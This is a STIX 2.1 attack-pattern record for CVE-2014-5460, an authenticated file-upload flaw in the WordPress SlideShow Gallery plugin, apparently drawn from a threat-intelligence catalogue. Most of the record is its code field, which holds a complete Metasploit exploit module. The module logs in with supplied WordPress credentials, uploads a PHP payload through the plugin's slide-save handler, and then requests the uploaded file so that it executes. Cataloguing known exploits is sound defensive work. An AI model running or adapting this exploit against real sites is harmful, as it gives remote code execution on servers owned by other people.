{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0053e743-b78e-46ce-901b-e18da1190577",
    "created": "2024-08-14T17:13:30.772214Z",
    "modified": "2024-08-14T17:13:30.772218Z",
    "name": "Wordpress SlideShow Gallery Authenticated File Upload",
    "description": " The Wordpress SlideShow Gallery plugin contains an authenticated file upload vulnerability. An attacker can upload arbitrary files to the upload folder. Since the plugin uses its own file upload mechanism instead of the WordPress API, it's possible to upload any file type. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_slideshowgallery_upload.rb",
            "external_id": "wp_slideshowgallery_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5460"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7532"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'Wordpress SlideShow Gallery Authenticated File Upload',\n      'Description'    => %q{\n          The Wordpress SlideShow Gallery plugin contains an authenticated file upload\n          vulnerability. An attacker can upload arbitrary files to the upload folder.\n          Since the plugin uses its own file upload mechanism instead of the WordPress\n          API, it's possible to upload any file type.\n      },\n      'Author'         =>\n        [\n          'Jesus Ramirez Pichardo', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'     # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-5460'],\n          ['EDB', '34681'],\n          ['WPVDB', '7532']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['WP SlideShow Gallery 1.4.6', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-08-28'))\n\n    register_options(\n      [\n        OptString.new('WP_USER', [true, 'A valid username', nil]),\n        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])\n      ])\n  end\n\n  def user\n    datastore['WP_USER']\n  end\n\n  def password\n    datastore['WP_PASSWORD']\n  end\n\n  def check\n    check_plugin_version_from_readme('slideshow-gallery', '1.4.7')\n  end\n\n  def exploit\n    print_status(\"Trying to login as #{user}\")\n    cookie = wordpress_login(user, password)\n    if cookie.nil?\n      print_error(\"Unable to login as #{user}\")\n      return\n    end\n    store_valid_credential(user: user, private: password, proof: cookie)\n\n    print_status(\"Trying to upload payload\")\n    filename = \"#{rand_text_alpha_lower(8)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(\"\", nil, nil, 'form-data; name=\"Slide[id]\"')\n    data.add_part(\"\", nil, nil, 'form-data; name=\"Slide[link]\"')\n    data.add_part(\"\", nil, nil, 'form-data; name=\"Slide[image_url]\"')\n    data.add_part('both', nil, nil, 'form-data; name=\"Slide[showinfo]\"')\n    data.add_part('randonx', nil, nil, 'form-data; name=\"Slide[description]\"')\n    data.add_part('file', nil, nil, 'form-data; name=\"Slide[type]\"')\n    data.add_part('randonx', nil, nil, 'form-data; name=\"Slide[title]\"')\n    data.add_part('70', nil, nil, 'form-data; name=\"Slide[iopacity]\"')\n    data.add_part('N', nil, nil, 'form-data; name=\"Slide[uselink]\"')\n    data.add_part(\"\", nil, nil, 'form-data; name=\"Slide[order]\"')\n    data.add_part('self', nil, nil, 'form-data; name=\"Slide[linktarget]\"')\n    data.add_part(payload.encoded, 'application/x-httpd-php', nil, \"form-data; name=\\\"image_file\\\"; filename=\\\"#{filename}\\\"\")\n    post_data = data.to_s\n\n    print_status(\"Uploading payload\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(wordpress_url_backend, 'admin.php'),\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'vars_get' => {\n        'page' => 'slideshow-slides',\n        'method' => 'save'\n      },\n      'data'     => post_data,\n      'cookie'   => cookie\n    })\n\n    if res\n      if res.code == 200\n        register_files_for_cleanup(filename)\n      else\n        fail_with(Failure::Unknown, \"#{peer} - You do not have sufficient permissions to access this page.\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    print_status(\"Calling uploaded file #{filename}\")\n    send_request_cgi(\n      'uri'    => normalize_uri(wordpress_url_wp_content, 'uploads', 'slideshow-gallery', filename)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-28",
    "x_mitre_platforms": [
        "['php']"
    ]
}